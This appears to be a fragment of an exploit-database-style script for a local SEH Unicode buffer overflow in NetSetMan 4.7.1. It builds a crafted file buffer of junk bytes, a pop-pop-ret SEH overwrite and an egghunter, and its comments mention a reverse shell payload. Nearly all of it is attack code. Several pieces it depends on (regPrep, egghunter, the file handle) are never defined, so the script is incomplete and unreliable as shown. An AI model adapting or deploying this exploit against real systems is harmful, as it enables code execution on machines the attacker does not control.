#Exploit Title: NetSetMan 4.7.1 - Local Buffer Overflow (SEH Unicode)
#This is a unicode SEH overflow, but the buffer is too small for a unicode encoded reverse shell payload.
#-v shellcode EXITFUNC=seh BufferRegister=EDI
buffer = ""
buffer += "\x61" * 75 #junk
buffer += "\x62" * 1  #nop
buffer += "\x58\x59" #SEH overwrite to pop-pop-ret instruction
buffer += regPrep
buffer += "\x62" * 108 #offset to egghunter
buffer += egghunter
f.write(buffer)
